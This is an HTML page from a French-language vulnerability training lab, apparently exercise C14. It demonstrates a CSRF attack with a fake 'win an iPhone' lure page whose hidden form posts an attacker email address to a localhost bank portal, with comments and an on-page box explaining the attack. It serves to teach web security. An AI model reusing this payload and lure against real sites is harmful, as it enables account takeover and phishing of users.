<!DOCTYPE html>
<!-- VulnLab C14 — Page malveillante simulant l'attaque CSRF -->
<!-- Accessible sur http://localhost/c14/attacker.php -->
<html lang="fr"><head><meta charset="UTF-8"><title>Concours en ligne — Gagnez un iPhone !</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
.card{background:#fff;border-radius:16px;padding:40px;max-width:440px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
.emoji{font-size:60px;margin-bottom:16px}
h1{font-size:24px;color:#1a2744;margin-bottom:8px}
p{font-size:14px;color:#8a94a6;margin-bottom:24px;line-height:1.6}
.btn{display:block;width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;margin-bottom:12px}
.small{font-size:11px;color:#b0b7c3}
.technical{background:#1e1e2e;border-radius:8px;padding:14px;margin-top:24px;text-align:left;font-family:monospace;font-size:11px;color:#cdd6f4;line-height:1.8}
.technical .lbl{color:#6c7086;font-size:10px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:6px}
</style></head><body>
<div class="card">
  <div class="emoji">🎉</div>
  <h1>Félicitations ! Vous avez gagné !</h1>
  <p>Cliquez sur le bouton ci-dessous pour réclamer votre iPhone 16 Pro.<br>
  Offre valable 5 minutes seulement !</p>

  <!-- ⚠️  CSRF ATTACK : ce formulaire poste vers le BankPortal de la victime -->
  <!-- Si la victime est connectée sur localhost/c14/, son email sera changé -->
  <form method="POST" action="http://localhost/c14/index.php" id="csrfForm">
    <input type="hidden" name="email" value="attacker@evil.com">
    <button type="submit" class="btn">🎁 Réclamer mon prix !</button>
  </form>
  <p class="small">En cliquant, vous acceptez nos conditions d'utilisation.</p>

  <div class="technical">
    <div class="lbl">🔍 Ce que ce bouton fait réellement</div>
    POST http://localhost/c14/index.php<br>
    Body: email=attacker@evil.com<br>
    <br>
    Pas de token CSRF → le serveur accepte<br>
    L'email de la victime est changé silencieusement
  </div>
</div>
</body></html>
